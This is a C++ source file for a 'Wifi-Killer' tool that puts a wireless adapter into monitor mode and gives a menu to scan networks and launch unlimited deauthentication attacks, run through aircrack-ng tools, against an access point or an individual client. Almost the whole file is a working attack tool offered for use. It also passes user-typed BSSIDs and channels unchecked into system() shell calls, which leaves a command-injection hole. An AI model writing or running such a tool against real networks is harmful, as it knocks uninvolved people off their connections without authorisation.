#include <iostream>
#include <unistd.h>
#include <stdexcept>
#include <stdio.h>
#include <vector>
#include <signal.h>
#include <algorithm>

using namespace std;

string findString(vector<string> strings, string word) {
	for (auto i = strings.begin(); i < strings.end(); ++i)
	{
		if ( (*i).find(word) != string::npos ) {
			return *i;
		}
	}
	return "";
}

string exec(string command) {
	char buffer[128];
	string result = "";
	FILE* pipe = popen(command.c_str(), "r");
	if (!pipe) throw runtime_error("popen() failed!");
	try {
		while ( fgets(buffer, sizeof(buffer), pipe) != NULL ) {
			result += buffer;
		}
	} catch (...) {
		pclose(pipe);
		throw;
	}
	pclose(pipe);
	return result;
}


void clear() {
	std::cout << "\x1B[2J\x1B[H";
}

void showLogo() {
	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
}

bool checkRoot() {
	return getuid() ? false : true;
}

vector<string> split(const string& str, const string& delim)
{
    vector<string> tokens;
    size_t prev = 0, pos = 0;
    do
    {
        pos = str.find(delim, prev);
        if (pos == string::npos) pos = str.length();
        string token = str.substr(prev, pos-prev);
        if (!token.empty()) tokens.push_back(token);
        prev = pos + delim.length();
    }
    while (pos < str.length() && prev < str.length());
    return tokens;
}

vector<string> getNetworkDevices() {
	string ipLinkResult = exec("ip link show | awk --field-separator=': ' '{print $2}' | awk 'NF > 0' | tr '\n' ' '");
	return split(ipLinkResult, " ");
}

void printNetworkDevices(vector<string> devices) {
	int index = 0;
	for (auto i = devices.begin(); i != devices.end(); ++i) {
		index = distance(devices.begin(), i);
		cout << index + 1 << ": " << *i << endl;
	}
}

int wifi(string adapter) {
	string bssid, ch, bssid2;
	int choice = 0;
	
	showLogo();
	
	cout << "\n1-Scan networks\n2-Kill AP\n3-Deauth attack\n4-Kill all soft using your Network Interface\n5-Exit\nWK>";
	cin  >> choice;
		
	switch (choice)
	{
	case 1:
		system(("airodump-ng " + adapter + "mon").c_str());
		wifi(adapter);
		break;
	
	case 2:
		system("clear");
		system(("airodump-ng " + adapter + "mon").c_str());
		cout<<"Enter BSSID to kill\nWK>";
		cin>>bssid;
		cout<<"Enter channel where work AP\nWK>";
		cin>>ch;
		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
		system("clear");
		cout<<"Kill atack started\n";
		sleep(3);
		system(("aireplay-ng --deauth 0 -a " + bssid + " " + adapter + "mon").c_str());
		clear();
		wifi(adapter);
		break;

	case 3:
		system(("airodump-ng " + adapter + "mon").c_str());
		cout<<"Enter BSSID to scan\nWK>";
		cin>>bssid;
		cout<<"Enter channel where work AP\nWK>";
		cin>>ch;
		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
		cout<<"Enter the station\nWK>";
		cin>>bssid2;
		system(("aireplay-ng --deauth 0 -a " + bssid + " -c " + bssid2 + " " + adapter + "mon").c_str());
		clear();
		wifi(adapter);
		break;

	case 4: 
		system("airmon-ng check kill");
		clear();
		wifi(adapter);
		break;

	case 5:
		clear();
		if (findString(getNetworkDevices(), "mon") != "") {
			cout << endl << "Stopping the mon interface..." << endl;
			exec(("airmon-ng stop " + findString(getNetworkDevices(), "mon")).c_str());
			cout << "Starting the network-manager..." << endl;
			exec("service network-manager start");
			exit(EXIT_SUCCESS);
		}
		break;

	default:
		wifi(adapter);
		break;
	}
	
	return 0;
}

void exit_handler(int Signal) {
	string adapter = findString(getNetworkDevices(), "mon");
	if (adapter != "") {
		cout << endl << "Stopping the mon interface..." << endl;
		exec(("airmon-ng stop " + adapter).c_str());
		cout << "Starting the network-manager..." << endl;
		exec("service network-manager start");
		exit(EXIT_SUCCESS);
	}
}

int main(int argc, char** argv) {
	vector<string> devices;
	int inputtedDevice = 0;

	clear();

	signal(SIGINT, exit_handler);

	if ( checkRoot() ) {
		showLogo();
		devices = getNetworkDevices();
		printNetworkDevices(devices);
		cout << "Input index of needed device" << endl << "WK>";
		cin >> inputtedDevice;

		exec(("airmon-ng start " + devices.at(inputtedDevice - 1)).c_str());
		clear();

		wifi(devices.at(inputtedDevice - 1));

		return 0;
	} else {
		cout << "Error!\n";
		cout << "Run wifi killer with sudo " << endl;
		return 1;
	}
}
